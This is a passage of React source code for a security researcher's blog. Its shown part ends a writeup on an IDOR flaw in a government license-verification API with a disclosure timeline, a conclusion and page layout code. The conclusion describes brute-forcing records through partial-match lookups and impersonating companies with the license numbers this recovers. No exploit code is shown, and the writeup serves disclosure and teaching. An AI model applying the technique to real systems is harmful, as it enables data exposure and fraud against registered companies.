                  <span className="hidden sm:inline">{priority}</span>
                </span>
              </div>
              <p className="text-xs text-gray-500 leading-relaxed">{desc}</p>
            </div>
          </div>
        ))}
      </div>

      {/* ── Timeline ─────────────────────────────── */}
      <H2>Disclosure Timeline</H2>
      <div className="glass-card overflow-hidden my-5">
        {[
          { date: 'Day 1', event: 'License verification endpoint identified during normal app onboarding flow', color: 'text-gray-400' },
          { date: 'Day 1', event: 'Partial input (4 digits) confirmed to return full company records via Burp Repeater', color: 'text-cyber-blue' },
          { date: 'Day 1', event: 'License impersonation vector confirmed — full number recovered from response', color: 'text-cyber-red' },
          { date: 'Day 1', event: 'PoC enumeration script written — 200 records collected in demonstration', color: 'text-cyber-red' },
          { date: 'Day 1', event: 'Full report submitted to the bug bounty program with writeup, HTTP transcripts, and PoC', color: 'text-cyber-green' },
          { date: 'Day 4', event: 'Program acknowledged receipt and began triage', color: 'text-gray-400' },
          { date: 'Day 9', event: 'Report marked as Duplicate — earlier submission by another researcher confirmed', color: 'text-yellow-400' },
          { date: 'Day 9', event: 'Reward of SAR 5,651 issued in recognition of independent discovery and documentation quality', color: 'text-cyber-green' },
        ].map(({ date, event, color }, i) => (
          <div key={i} className="flex items-start gap-4 px-5 py-3 border-b border-cyber-border/20 last:border-0 hover:bg-cyber-bg/30 transition-colors">
            <span className="font-mono text-xs text-gray-600 w-12 flex-shrink-0">{date}</span>
            <span className={`font-mono text-xs ${color}`}>{event}</span>
          </div>
        ))}
      </div>

      {/* ── Conclusion ───────────────────────────── */}
      <H2>Conclusion</H2>
      <P>
        This vulnerability is a textbook case of conflating input format with input validation.
        The platform's designers likely assumed that a 12-digit license number would be difficult
        to guess — effectively treating it as a secret. But the backend's partial-match behavior
        collapsed the search space from one trillion to just ten thousand values, making
        brute-force entirely practical.
      </P>
      <P>
        The most serious risk is not the data exposure in isolation but the{' '}
        <span className="text-orange-400 font-semibold">license impersonation chain</span>:
        because the response includes the full valid identifier, an attacker can immediately
        recycle stolen license numbers to fraudulently assume the identity of registered
        companies on a government platform — with real legal and commercial consequences.
      </P>
      <P>
        The duplicate status is also a useful reminder: on high-value programs, common
        vulnerability classes are routinely found by multiple researchers in parallel. Speed
        of reporting matters, but clear documentation, a working PoC, and a well-scoped
        impact analysis remain rewarded even as duplicates — and make a stronger case for
        appropriate severity classification.
      </P>

      <Callout type="info" title="Tools Used in This Assessment">
        <span className="flex flex-wrap gap-2 mt-1">
          {['Burp Suite', 'Burp Repeater', 'Python 3', 'requests', 'Browser DevTools'].map(t => (
            <IC key={t}>{t}</IC>
          ))}
        </span>
      </Callout>

    </div>
  )
}

/* ─── Severity badge styles ─────────────────────────── */
const SEVERITY_STYLES = {
  Critical: 'bg-cyber-red/10 text-cyber-red border-cyber-red/30',
  High:     'bg-orange-500/10 text-orange-400 border-orange-500/30',
  Medium:   'bg-yellow-500/10 text-yellow-400 border-yellow-500/30',
  Low:      'bg-cyber-blue/10 text-cyber-blue border-cyber-blue/30',
}

/* ─── Post router ───────────────────────────────────── */
function PostContent({ slug }) {
  if (slug === 'mass-idor-citizen-data-leak')        return <IDORPost />
  if (slug === 'idor-license-api-enumeration')       return <IDORLicensePost />
  if (slug === 'nafath-auth-bypass-national-id')     return <NafathBypassPost />
  return (
    <div className="text-center py-16 text-gray-600 font-mono text-sm">
      <Shield className="w-10 h-10 mx-auto mb-3 opacity-30" />
      <p>Full writeup coming soon...</p>
    </div>
  )
}

/* ─── Main page ─────────────────────────────────────── */
export default function BlogPost() {
  const { slug } = useParams()
  const post = getPost(slug)

  if (!post) return <Navigate to="/blog" replace />

  return (
    <main className="relative z-10 pt-24 pb-24 px-4 sm:px-6">
      <div className="max-w-4xl mx-auto">

        <Link
          to="/blog"
          className="inline-flex items-center gap-1.5 text-gray-500 hover:text-cyber-green font-mono text-xs mb-8 transition-colors"
        >
          <ArrowLeft className="w-3.5 h-3.5" /> cd ../blog
        </Link>

        {/* Header */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="glass-card p-5 sm:p-8 mb-8 overflow-hidden relative"
        >
          <div className={clsx('absolute top-0 left-0 right-0 h-0.5 bg-gradient-to-r', post.coverGradient.split(' ')[0], 'to-cyber-blue/60')} />

          <div className="flex flex-wrap gap-2 mb-4">
            <span className="tag tag-purple">{post.category}</span>
            {post.severity && (
              <span className={clsx('tag', SEVERITY_STYLES[post.severity] || 'tag-blue')}>
                {post.severity}
              </span>
            )}
            {post.platform && (
              <span className="tag tag-blue">
                <Bug className="w-2.5 h-2.5 mr-0.5" />{post.platform}
              </span>
            )}
            {post.bounty && (
              <span className="tag bg-emerald-500/10 text-emerald-400 border-emerald-500/30">
                <DollarSign className="w-2.5 h-2.5 mr-0.5" />{post.bounty}
              </span>
            )}
          </div>

          <h1 className="text-2xl lg:text-3xl font-bold text-white mb-4 leading-tight">
            {post.title}
          </h1>
          <p className="text-gray-400 text-sm leading-relaxed mb-5">{post.excerpt}</p>

          <div className="flex flex-wrap items-center gap-4 text-xs font-mono text-gray-600 mb-5">
            <span className="flex items-center gap-1.5"><Calendar className="w-3 h-3" />{post.date}</span>
            <span className="flex items-center gap-1.5"><Clock className="w-3 h-3" />{post.readTime} read</span>
            <span className="flex items-center gap-1.5"><Shield className="w-3 h-3 text-cyber-green" />Yousef Zain Aldeen</span>
          </div>

          <div className="flex flex-wrap gap-1.5">
            {post.tags.map((tag) => (
              <span key={tag} className="px-2 py-0.5 rounded text-xs font-mono bg-cyber-surface text-gray-500 border border-cyber-border/50">
                #{tag.toLowerCase().replace(/\s+/g, '-')}
              </span>
            ))}
          </div>
        </motion.div>

        {/* Body */}
        <motion.div
          initial={{ opacity: 0, y: 16 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.15 }}
          className="glass-card p-4 sm:p-8"
        >
          <PostContent slug={slug} />
        </motion.div>
      </div>
    </main>
  )
}
